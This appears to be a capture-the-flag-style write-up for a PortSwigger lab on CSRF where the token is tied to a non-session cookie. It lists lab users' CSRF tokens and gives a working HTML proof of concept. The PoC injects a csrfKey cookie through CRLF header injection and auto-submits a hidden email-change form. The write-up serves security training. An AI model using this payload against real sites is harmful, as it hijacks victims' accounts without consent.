## Lab Description: CSRF where token is tied to non-session cookie

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/b19ba3ae-575d-407c-9929-704389e773b0)


## Solution

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/09d2716c-58a9-4ad8-93b6-af2febc8a33e)


For User Wiener 

csrf: gDbE9aGELpWRSrZzpZEKiBbylXUETUFq
csrfkey: LbMYzTBNpxwMUXksBmrOjPbthEd8Na4f

For User Carlos 

csrf: OVfPpgEizfZ5aZBoTEsroDPgKMNt3YM4
csrf Key: 24uBgd1HRRlHUII7bYBNz7F1lVekHYDc

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/8bd8fe0b-5e4a-4a9e-a484-5061cafc35a6)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/6ad8180c-31df-4fdf-b21e-762a9e349ea4)

we are able to change the email test@3123@gmail.com

In order to exploit this vulnerability we need to perform 2 things: 
- Inject a csrfkey cookie in the user session
- Send a csrf  attack to the victim with a known a csrf token

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/21cf1671-4f61-4f81-987f-46b9628f543d)


![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/614289c9-9d8e-4f47-b3f1-18ee06cd50e8)



we have to add csrf key in request 

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/53c90d0f-f534-42a2-8892-2cdf7849f8d0)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/1cc784c3-31e6-48fa-b0ce-5b97dba3970f)



```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/');</script>
    <form action="https://0ac1000b0422fe7d82422e29004d0020.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hii45&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="tUPKneNhIgQi2QfZI41tvlsVR6e53bh4" />
      <input type="submit" value="Submit request" />
    </form>
  <img src="https://0ac1000b0422fe7d82422e29004d0020.web-security-academy.net/?search=hey%0d%0aSet-Cookie:%20csrfKey=SQFZcaxFoVU3URyQrh2buswScSlxyapG%3b%20SameSite=None" onerror="document.forms[0].submit()">
 </body>
</html>

```

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/c21c852a-8c07-4bef-9760-37ebb0fd3daf)


![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/b19c82f4-c9af-4d10-8528-413e64c64b36)

